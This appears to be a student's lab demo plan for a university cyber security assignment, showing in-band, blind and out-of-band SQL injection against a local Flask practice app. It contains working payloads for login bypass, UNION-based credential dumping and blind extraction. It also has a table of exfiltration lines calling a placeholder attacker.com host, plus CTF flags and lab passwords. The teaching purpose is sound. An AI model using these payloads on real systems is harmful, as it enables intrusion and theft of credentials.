# SQL Injection Demo Plan — All 3 Types
## IIT Jodhpur | Cyber Security Assignment

---

## Prerequisites

```bash
pip install flask
cd sqli_demo_app
python app.py
# Open http://localhost:5000
```

---

## TYPE 1: IN-BAND SQL INJECTION

**Page:** `/login` (Student Login) and `/profile?id=1` (Student Profile)

In-band SQLi is the most common type — the attacker receives results directly in the HTTP response.

### Demo 1A: Error-Based SQLi (Login Page)

**Goal:** Force the database to reveal error messages that leak schema information.

| Step | Action | What to Enter |
|------|--------|---------------|
| 1 | Go to `/login` | — |
| 2 | Enter a single quote in Roll Number | `'` |
| 3 | Click Login | — |
| 4 | Observe the error | The error message reveals the full SQL query structure |

**What happens:** The app shows `Database Error: unrecognized token...` which tells the attacker the query structure and that the input is not sanitized.

### Demo 1B: Authentication Bypass (Login Page)

**Goal:** Login without knowing any password by injecting a condition that always evaluates to TRUE.

| Step | Action | What to Enter |
|------|--------|---------------|
| 1 | Go to `/login` | — |
| 2 | Roll Number field | `' OR '1'='1' --` |
| 3 | Password field | `anything` |
| 4 | Click Login | — |

**What happens:** The query becomes:
```sql
SELECT * FROM students WHERE roll_number = '' OR '1'='1' --' AND password = 'anything'
```
The `OR '1'='1'` is always TRUE, and `--` comments out the password check. All 10 student records are returned, including their passwords.

### Demo 1C: UNION-Based SQLi (Profile Page)

**Goal:** Use UNION SELECT to extract data from other tables (admin credentials, secret flags).

| Step | Action | URL to Visit |
|------|--------|-------------|
| 1 | Find column count | `/profile?id=1 ORDER BY 6--` (works) then `/profile?id=1 ORDER BY 7--` (error = 6 columns) |
| 2 | Extract DB schema | `/profile?id=0 UNION SELECT 1,name,type,sql,5,6 FROM sqlite_master--` |
| 3 | Dump admin credentials | `/profile?id=0 UNION SELECT 1,username,password,role,secret_notes,6 FROM admin_users--` |
| 4 | Capture the flag | `/profile?id=0 UNION SELECT 1,flag_name,flag_value,4,5,6 FROM secret_flags--` |

**What happens:** The attacker discovers admin username `admin` with password `SuperSecret@2026` and secret notes containing master passwords. Flag captured: `IITJ{in_band_sqli_union_attack_success}`

---

## TYPE 2: BLIND SQL INJECTION

**Page:** `/search` (Student Search)

Blind SQLi is used when the application does not display query results or error messages — only "Found" or "Not Found". The attacker infers data by observing behavioral differences.

### Demo 2A: Boolean-Based Blind SQLi

**Goal:** Extract data character by character using TRUE/FALSE conditions.

| Step | Action | What to Enter in Search |
|------|--------|------------------------|
| 1 | Confirm injection works (TRUE) | `' OR 1=1 --` → shows "Student Found" |
| 2 | Confirm injection works (FALSE) | `' OR 1=2 --` → shows "Student Not Found" |
| 3 | Check if admin table exists | `' OR (SELECT count(*) FROM admin_users) > 0 --` → "Found" = YES |
| 4 | Extract first char of admin password | `' OR (SELECT substr(password,1,1) FROM admin_users WHERE username='admin')='S' --` → "Found" = first char is 'S' |
| 5 | Extract second char | `' OR (SELECT substr(password,1,2) FROM admin_users WHERE username='admin')='Su' --` → "Found" = 'Su' |

**What happens:** By asking yes/no questions, the attacker extracts the admin password one character at a time. The response only says "Found" or "Not Found" — no data is ever shown directly.

### Demo 2B: Time-Based Blind SQLi

**Goal:** When even boolean differences are hidden, use time delays to infer TRUE/FALSE.

| Step | Action | What to Enter in Search |
|------|--------|------------------------|
| 1 | Baseline timing | `G25AIT2079` → observe response time (~0.001s) |
| 2 | Inject a 3-second sleep | `' OR sleep(3) --` → response takes ~3 seconds |
| 3 | Conditional sleep (TRUE) | `' OR CASE WHEN (SELECT substr(username,1,1) FROM admin_users LIMIT 1)='a' THEN sleep(3) ELSE 0 END --` → 3 second delay = first char is 'a' |
| 4 | Conditional sleep (FALSE) | Same but test `='b'` → instant response = not 'b' |

**What happens:** The response time jumps from ~0.001s to ~3s when the condition is TRUE. The attacker watches the "Response Time" badge on the page to determine if each guess is correct.

---

## TYPE 3: OUT-OF-BAND SQL INJECTION

**Page:** `/oob_demo` (Notifications)

Out-of-band SQLi sends data through a completely separate channel (DNS lookup, HTTP request) rather than through the web response. This demo simulates it using a custom `exfiltrate()` function that logs data to a file (representing an attacker's DNS/HTTP server).

### Demo 3A: Basic OOB Exfiltration

**Goal:** Make the database send student data to the "attacker's server."

| Step | Action | What to Enter |
|------|--------|---------------|
| 1 | Go to `/oob_demo` | — |
| 2 | Enter a valid roll number | `G25AIT2079` |
| 3 | Click Execute | — |
| 4 | Observe the Exfiltration Log | Shows `Rajath S M:rajath789` was "sent" to the attacker |

**What happens:** The query calls `exfiltrate(name || ':' || password)` which simulates sending data over DNS/HTTP. The data appears in the "Attacker's Exfiltration Log" at the bottom of the page.

### Demo 3B: Mass Data Exfiltration via UNION + OOB

**Goal:** Extract ALL credentials from all tables through the out-of-band channel.

| Step | Action | What to Enter |
|------|--------|---------------|
| 1 | Exfil all students | `' UNION SELECT exfiltrate(roll_number \|\| ':' \|\| name \|\| ':' \|\| password) FROM students--` |
| 2 | Exfil admin data | `' UNION SELECT exfiltrate(username \|\| ':' \|\| password \|\| ':' \|\| secret_notes) FROM admin_users--` |
| 3 | Capture the flag | `' UNION SELECT exfiltrate(flag_name \|\| '=' \|\| flag_value) FROM secret_flags WHERE id=3--` |

**What happens:** The exfiltration log fills up with all stolen data — credentials, admin passwords, secret notes — all extracted through a "side channel" without any of it appearing in the normal web response.

### Real-World OOB Techniques (Explain During Presentation)

In production databases, OOB exfiltration uses built-in functions:

| Database | OOB Technique |
|----------|---------------|
| Oracle | `UTL_HTTP.REQUEST('http://attacker.com/' \|\| data)` |
| MSSQL | `xp_cmdshell('nslookup ' + data + '.attacker.com')` |
| MySQL | `LOAD_FILE('\\\\attacker.com\\' + data)` |
| PostgreSQL | `COPY ... TO PROGRAM 'curl http://attacker.com/'` |

---

## SUMMARY TABLE

| Type | Page | What Attacker Sees | Key Payloads |
|------|------|--------------------|-------------|
| In-Band (Error) | `/login` | Full error messages with SQL | `'` |
| In-Band (UNION) | `/profile` | Data from other tables in response | `UNION SELECT ... FROM admin_users` |
| Blind (Boolean) | `/search` | Only "Found" / "Not Found" | `' OR (condition) --` |
| Blind (Time) | `/search` | Response time difference | `' OR sleep(3) --` |
| Out-of-Band | `/oob_demo` | Nothing in response; data on attacker server | `exfiltrate()` + UNION |

---

## CTF FLAGS (For Fun)

| Flag | Where to Find It |
|------|-----------------|
| `IITJ{in_band_sqli_union_attack_success}` | `/profile` via UNION on `secret_flags` |
| `IITJ{blind_sqli_boolean_time_based_win}` | `/search` via boolean blind on `secret_flags` |
| `IITJ{out_of_band_exfiltration_complete}` | `/oob_demo` via OOB exfiltration |

---

## RESET

Visit `/reset_db` at any time to restore the database to its original state.
